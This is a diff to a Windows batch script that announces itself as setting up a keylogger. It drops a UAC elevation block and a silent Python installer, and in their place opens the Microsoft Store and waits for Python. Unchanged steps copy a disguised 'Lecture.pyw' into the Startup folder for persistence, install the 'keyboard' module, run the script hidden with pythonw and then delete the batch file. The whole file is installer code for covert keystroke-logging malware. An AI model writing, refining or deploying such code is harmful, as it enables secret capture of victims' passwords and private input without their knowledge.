@@ -1,12 +1,4 @@
 @echo off
-REM Check if running as administrator
-net session >nul 2>&1
-if %errorlevel% neq 0 (
-    echo Requesting administrator privileges...
-    powershell -Command "Start-Process '%~f0' -Verb RunAs"
-    exit /b
-)
-
 echo Setting up Keylogger...
 
 REM Step 1: Download Lecture.pyw from GitHub
@@ -17,25 +9,33 @@ REM Step 2: Move Lecture.pyw to Startup folder
 echo Moving Lecture.pyw to Startup folder...
 move "%USERPROFILE%\Downloads\Lecture.pyw" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
 
-REM Step 3: Download and install Python 3.12 silently
-echo Downloading Python 3.12 installer...
-powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.12.0/python-3.12.0-amd64.exe' -OutFile '%TEMP%\python_installer.exe'"
+REM Step 3: Open Microsoft Store for Python 3.12 installation
+echo Opening Microsoft Store for Python 3.12 installation...
+start ms-windows-store://pdp/?productid=9NCVDN91XZQP
 
-echo Installing Python 3.12...
-start /wait "" "%TEMP%\python_installer.exe" /quiet InstallAllUsers=1 PrependPath=1
-del "%TEMP%\python_installer.exe"
+REM Wait until Python is installed
+echo Waiting for Python 3.12 to be installed...
+:check_python
+where python >nul 2>&1
+if %errorlevel% neq 0 (
+    echo Python is not installed yet. Waiting...
+    timeout /t 10 >nul
+    goto check_python
+)
 
-REM Step 4: Install the 'keyboard' module
+echo Python is installed.
+
+REM Step 5: Install the 'keyboard' module
 echo Installing 'keyboard' module...
 pip install keyboard
 
-REM Step 5: Run Lecture.pyw in hidden mode using pythonw.exe
+REM Step 6: Run Lecture.pyw in hidden mode using pythonw.exe
 echo Running Lecture.pyw in hidden mode...
 start /b pythonw "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Lecture.pyw"
 
-REM Step 6: Delete the BAT file after execution
+REM Step 7: Delete the BAT file after execution
 echo Deleting BAT file...
 del "%~f0"
 
-REM Step 7: Close CMD window automatically
+REM Step 8: Close CMD window automatically
 exit
